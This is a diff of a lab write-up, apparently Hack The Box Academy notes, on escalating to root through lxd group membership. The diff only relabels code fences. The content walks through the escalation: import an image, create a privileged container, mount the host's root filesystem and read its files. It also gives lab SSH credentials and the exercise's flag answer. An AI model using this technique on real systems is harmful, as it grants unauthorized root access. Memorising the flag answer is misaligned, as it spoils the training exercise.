@@ -9,7 +9,7 @@ Linux Containers (LXC) is an operating system-level virtualization technique tha
 ### Linux Daemon
 Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:
 
-```sh
+```shellsession
 $ id
 
 uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
@@ -17,21 +17,21 @@ uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),11
 
 We can either create our own container and transfer it to the target system or use an existing container. 
 
-```sh
+```shellsession
 $ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
 $ lxc image list
 ```
 
 After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
 
-```sh
+```shellsession
 $ lxc init ubuntutemp privesc -c security.privileged=true
 $ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 
 Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.
 
-```sh
+```shellsession
 $ lxc start privesc
 $ lxc exec privesc /bin/bash
 root@nix02:~# ls -l /mnt/root
@@ -41,7 +41,7 @@ root@nix02:~# ls -l /mnt/root
 SSH to 10.129.201.127 (ACADEMY-LLPE-CONT), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{C0nT41n3rs_uhhh}**
    - Found an existing image, import it, create a container that mount the host's `root` directoy and disable all isolation features with flag `security.privileged` enabled:
-        ```sh
+        ```shellsession
         $ cd ContainerImages/
         $ ls
         alpine-v3.18-x86_64-20230607_1234.tar.gz
@@ -60,7 +60,7 @@ SSH to 10.129.201.127 (ACADEMY-LLPE-CONT), with user `htb-student` and password 
         Device host-root added to privesc
         ```
    - Start the container, execute into it and read the flag on the mounted folder:
-        ```sh
+        ```shellsession
         $ lxc start privesc
         $ lxc exec privesc /bin/sh
         ~ # cat /mnt/root/root/flag.txt
